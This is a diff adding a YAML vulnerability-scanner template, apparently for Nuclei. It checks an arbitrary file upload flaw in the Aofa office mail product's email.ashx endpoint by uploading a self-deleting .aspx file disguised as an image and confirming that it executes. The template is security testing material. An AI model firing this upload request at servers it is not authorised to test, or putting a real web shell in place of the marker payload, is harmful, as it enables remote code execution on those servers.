@@ -1,0 +1,39 @@
+id: aofa-email_ashx-File-upload
+
+info:
+  name: 傲发办公通信专家 email.ashx 任意文件上传漏洞
+  author: xxx
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /handle/email.ashx?action=updatefiles&logname=stc HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+        Content-Type: image/png
+
+        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+  - raw:
+      - |
+        GET /upFiles/email/temp/stc/{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
